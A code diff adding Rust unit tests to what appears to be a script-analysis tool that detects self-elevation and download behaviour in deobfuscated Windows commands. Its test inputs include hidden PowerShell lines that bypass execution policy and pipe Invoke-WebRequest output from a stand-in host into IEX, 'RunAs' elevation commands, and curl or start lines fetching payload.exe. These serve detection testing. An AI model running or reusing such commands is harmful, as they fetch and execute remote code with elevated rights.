@@ -1823,6 +1823,27 @@ start "" /b %COMSPEC% /V:ON /c "set U=https://start-escaped.example/payload.exe&
     }
 
     #[test]
+    fn deob_text_start_alias_verb_runas_emits_self_elevation_trait() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::deob_scan::scan_deob_text(
+            r#"start -FilePath powershell.exe -ArgumentList calc.exe -Verb RunAs"#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "calc.exe"
+            )),
+            "deob-text start alias SelfElevation missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn native_runas_replays_quoted_child_command() {
         let script = br#"echo url = "https://runas-native.example/payload.exe" > curl.cfg
 runas /user:Administrator "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
@@ -34544,6 +34565,62 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             )
         });
         assert!(has, "file:/// URL was not preserved: {:?}", env.traits);
+    }
+
+    #[test]
+    fn deob_text_embedded_powershell_iwr_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"w.Run "!powershell -WindowStyle Hidden -Nologo -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri https://embedded-ps.example/fp.ps1 -UseBasicParsing | IEX ""!", 0, False"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://embedded-ps.example/fp.ps1"
+            )
+        });
+        assert!(
+            has,
+            "embedded PowerShell IWR URL not typed as Download: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://embedded-ps.example/fp.ps1"
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "embedded PowerShell IWR URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_embedded_powershell_file_url_is_extracted() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"w.Run "!powershell -WindowStyle Hidden -Nologo -ExecutionPolicy Bypass -Command ""Write-Host file:///C:/Temp/payload.exe""", 0, False"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::DownloadInDeobText { src, .. } if src == "file:///C:/Temp/payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "embedded PowerShell file URL not surfaced: {:?}",
+            env.traits
+        );
     }
 
     #[test]
